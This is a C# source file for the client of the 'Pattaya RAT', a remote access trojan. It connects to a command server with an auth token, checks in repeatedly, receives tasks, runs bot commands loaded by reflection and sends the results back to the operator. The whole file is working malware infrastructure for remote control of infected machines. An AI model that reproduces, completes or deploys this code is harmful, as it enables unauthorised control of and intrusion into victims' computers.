using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace pattaya_project_client
{
    public class Program
    {

        private static List<BotCommand> _commands = new List<BotCommand>();
        private static SocketIO _client;
        private static CancellationTokenSource _tokenSource;
        private static BotCharacter _character;
        static async Task Main(string[] args)
        {
            Console.Title = $"Pattaya RAT client version: {Config.Version} | Server URL {Config.BotServer}";

            _character = Utils.BotUtil.GenerateChracter();
            LoadBotCommands();
            _tokenSource = new CancellationTokenSource();
            _client = new SocketIO(Config.BotServer, new SocketIOOptions
            {
                ExtraHeaders = new Dictionary<string, string>
                {
                    { "Authorization", $"{Config.BotTokenMask} {Config.BotToken}" }
                },
                ConnectionTimeout = Config.BotWSTimeout
            });

            _client.On(Config.BotReceiveTask, response =>
            {
                var task = response.GetValue<BotTask>(0);
                Task.Run(() => ProcessBotTask(task));

            });

            _client.OnConnected += async (sender, e) =>
            {
                Console.WriteLine($"Pattaya Bot has been connected to server: {Config.BotServer}");
                await _client.EmitAsync(Config.BotCheckIn, _character);

            };

            try
            {
                await _client.ConnectAsync();

                while (!_tokenSource.IsCancellationRequested)
                {
                    
                    Thread.Sleep(Config.SignalDelay);
                    try
                    {
                        await _client.EmitAsync(Config.BotCheckIn, _character);
                        Console.WriteLine("Pattaya bot re-checkin");
                    }
                    catch (Exception)
                    {

                        Console.WriteLine("Pattaya bot re-checkin failed");
                    }
                    
                }
            }
            catch (Exception)
            {
                Console.WriteLine("Pattaya connection timeout");
            }



        }

        private static void ProcessBotTask(BotTask task)
        {

            var command = _commands.FirstOrDefault(c => c.TaskName.Equals(task.Command, StringComparison.OrdinalIgnoreCase));

            if (command is null)
            {
                EmitTaskResult(new BotTaskResult
                {
                    TaskId = task.TaskId, 
                    Result = "Command not found"
                });
                return;
            }

            try
            {
                var result = command.RunTask(task);
                EmitTaskResult(result);
            }
            catch (Exception e)
            {

                EmitTaskResult(new BotTaskResult
                {
                    TaskId = task.TaskId,
                    Result = e.Message
                });
            }

        }

        private static void EmitTaskResult(BotTaskResult botTaskResult)
        {
            _client.EmitAsync(Config.BotSendResult, botTaskResult);
        }

        private static void LoadBotCommands()
        {
            var self = Assembly.GetEntryAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(BotCommand)))
                {
                    var command = (BotCommand)Activator.CreateInstance(type);
                    _commands.Add(command);
                }
            }
        }
    }
}
